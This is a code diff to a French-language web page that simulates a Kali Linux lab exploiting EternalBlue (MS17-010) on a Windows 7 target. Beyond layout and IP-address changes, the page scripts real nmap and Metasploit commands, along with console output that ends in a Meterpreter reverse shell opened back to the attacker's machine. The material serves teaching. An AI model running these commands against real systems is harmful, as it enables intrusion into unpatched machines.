@@ -58,9 +58,18 @@
 
         .logo i { color: var(--kali-blue); }
 
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
         .status-bar {
             font-size: 0.9rem;
             color: #8b949e;
+            display: flex;
+            align-items: center;
+            gap: 15px;
         }
 
         .status-badge {
@@ -69,7 +78,26 @@
             padding: 2px 8px;
             border-radius: 4px;
             font-size: 0.8rem;
-            margin-left: 10px;
+        }
+
+        .external-link-btn {
+            background-color: #333;
+            color: var(--kali-blue);
+            text-decoration: none;
+            padding: 5px 12px;
+            border-radius: 4px;
+            font-size: 0.9rem;
+            font-weight: bold;
+            border: 1px solid var(--kali-blue);
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .external-link-btn:hover {
+            background-color: var(--kali-blue);
+            color: white;
         }
 
         main {
@@ -87,6 +115,11 @@
                 grid-template-columns: 1fr;
                 grid-template-rows: 1fr 1fr;
                 overflow-y: auto;
+            }
+            .header-right {
+                flex-direction: column;
+                align-items: flex-end;
+                gap: 5px;
             }
         }
 
@@ -338,10 +371,15 @@
             <i class="fa-brands fa-linux"></i>
             KALI LINUX <span style="font-weight:normal; font-size:1rem; opacity:0.8; margin-left:10px;">| Lab Virtuel : EternalBlue</span>
         </div>
-        <div class="status-bar">
-            <span>Machine Attaquant: 192.168.56.102</span>
-            <span>Cible: 192.168.56.101 (Win7)</span>
-            <span class="status-badge">CONNECTED</span>
+        <div class="header-right">
+            <div class="status-bar">
+                <span>Attaquant: 192.168.100.139</span>
+                <span>Cible: 192.168.100.102 (Win7)</span>
+                <span class="status-badge">CONNECTED</span>
+            </div>
+            <a href="https://vaerad.github.io/EternalBlue2/" target="_blank" class="external-link-btn">
+                <i class="fa-solid fa-up-right-from-square"></i> Tuto Détaillé
+            </a>
         </div>
     </header>
 
@@ -385,7 +423,7 @@
                         On vérifie si le port 445 (SMB) est ouvert et si la faille MS17-010 est présente grâce au script NSE de Nmap.
                     </div>
                     <div class="command-preview">
-                        <span>nmap</span> --script smb-vuln-ms17-010 192.168.56.101
+                        <span>nmap</span> --script smb-vuln-ms17-010 192.168.100.102
                     </div>
                     <div class="step-actions">
                         <button class="play-step-btn" onclick="runSingleStage('card-recon')">
@@ -429,7 +467,7 @@
                         <br>• <strong>LHOST</strong> (Local) : Notre IP (Kali) pour recevoir la connexion retour.
                     </div>
                     <div class="command-preview">
-                        <span>set</span> RHOSTS 192.168.56.101
+                        <span>set</span> RHOSTS 192.168.100.102
                     </div>
                     <div class="step-actions">
                         <button class="play-step-btn" onclick="runSingleStage('card-config')">
@@ -499,14 +537,14 @@
             {
                 type: 'command',
                 stage: 'card-recon',
-                text: 'nmap -Pn -p 445 --script smb-vuln-ms17-010 192.168.56.101',
+                text: 'nmap -Pn -p 445 --script smb-vuln-ms17-010 192.168.100.102',
                 delay: 50
             },
             {
                 type: 'output',
                 stage: 'card-recon',
                 text: `Starting Nmap 7.92 ( https://nmap.org ) at 2023-10-25 10:00 CET
-Nmap scan report for 192.168.56.101
+Nmap scan report for 192.168.100.102
 Host is up (0.00045s latency).
 
 PORT    STATE SERVICE
@@ -562,27 +600,27 @@ Metasploit tip: Use the 'save' command to save your current configuration
             {
                 type: 'command',
                 stage: 'card-config',
-                text: 'set RHOSTS 192.168.56.101',
+                text: 'set RHOSTS 192.168.100.102',
                 delay: 600,
                 prompt: 'msf6 exploit(windows/smb/ms17_010_eternalblue) > '
             },
             {
                 type: 'output',
                 stage: 'card-config',
-                text: 'RHOSTS => 192.168.56.101\n',
+                text: 'RHOSTS => 192.168.100.102\n',
                 delay: 300
             },
             {
                 type: 'command',
                 stage: 'card-config',
-                text: 'set LHOST 192.168.56.102',
+                text: 'set LHOST 192.168.100.139',
                 delay: 600,
                 prompt: 'msf6 exploit(windows/smb/ms17_010_eternalblue) > '
             },
             {
                 type: 'output',
                 stage: 'card-config',
-                text: 'LHOST => 192.168.56.102\n',
+                text: 'LHOST => 192.168.100.139\n',
                 delay: 300
             },
             {
@@ -595,32 +633,32 @@ Metasploit tip: Use the 'save' command to save your current configuration
             {
                 type: 'output',
                 stage: 'card-attack',
-                text: `[*] Started reverse TCP handler on 192.168.56.102:4444 
-[*] 192.168.56.101:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
-[+] 192.168.56.101:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
-[*] 192.168.56.101:445 - Scanned 1 of 1 hosts (100% complete)
-[*] 192.168.56.101:445 - Connecting to target for exploitation.
-[+] 192.168.56.101:445 - Connection established for exploitation.
-[+] 192.168.56.101:445 - Target OS selected valid for OS indicated by SMB reply
-[*] 192.168.56.101:445 - CORE raw buffer dump (42 bytes)
-[*] 192.168.56.101:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
-[*] 192.168.56.101:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
-[*] 192.168.56.101:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
-[+] 192.168.56.101:445 - Target arch selected valid for arch indicated by DCS reply
-[*] 192.168.56.101:445 - Trying exploit with 12 Groom Allocations.
-[*] 192.168.56.101:445 - Sending all but last fragment of exploit packet
-[*] 192.168.56.101:445 - Starting non-paged pool grooming
-[+] 192.168.56.101:445 - Sending SMBv2 buffers
-[+] 192.168.56.101:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
-[*] 192.168.56.101:445 - Sending final SMBv2 buffers.
-[*] 192.168.56.101:445 - Sending last fragment of exploit packet!
-[*] 192.168.56.101:445 - Receiving response from exploit packet
-[+] 192.168.56.101:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
-[*] 192.168.56.101:445 - Sending egg to locate shellcode.
-[+] 192.168.56.101:445 - Forged process fields successfully overwritten
-[*] 192.168.56.101:445 - Triggering free of corrupted buffer.
-[*] Sending stage (200262 bytes) to 192.168.56.101
-[*] Meterpreter session 1 opened (192.168.56.102:4444 -> 192.168.56.101:49158) at 2023-10-25 10:01:23 +0100
+                text: `[*] Started reverse TCP handler on 192.168.100.139:4444 
+[*] 192.168.100.102:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 192.168.100.102:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 192.168.100.102:445 - Scanned 1 of 1 hosts (100% complete)
+[*] 192.168.100.102:445 - Connecting to target for exploitation.
+[+] 192.168.100.102:445 - Connection established for exploitation.
+[+] 192.168.100.102:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 192.168.100.102:445 - CORE raw buffer dump (42 bytes)
+[*] 192.168.100.102:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 192.168.100.102:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 192.168.100.102:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[+] 192.168.100.102:445 - Target arch selected valid for arch indicated by DCS reply
+[*] 192.168.100.102:445 - Trying exploit with 12 Groom Allocations.
+[*] 192.168.100.102:445 - Sending all but last fragment of exploit packet
+[*] 192.168.100.102:445 - Starting non-paged pool grooming
+[+] 192.168.100.102:445 - Sending SMBv2 buffers
+[+] 192.168.100.102:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 192.168.100.102:445 - Sending final SMBv2 buffers.
+[*] 192.168.100.102:445 - Sending last fragment of exploit packet!
+[*] 192.168.100.102:445 - Receiving response from exploit packet
+[+] 192.168.100.102:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 192.168.100.102:445 - Sending egg to locate shellcode.
+[+] 192.168.100.102:445 - Forged process fields successfully overwritten
+[*] 192.168.100.102:445 - Triggering free of corrupted buffer.
+[*] Sending stage (200262 bytes) to 192.168.100.102
+[*] Meterpreter session 1 opened (192.168.100.139:4444 -> 192.168.100.102:49158) at 2023-10-25 10:01:23 +0100
 `,
                 delay: 3000,
                 promptChange: 'meterpreter > '
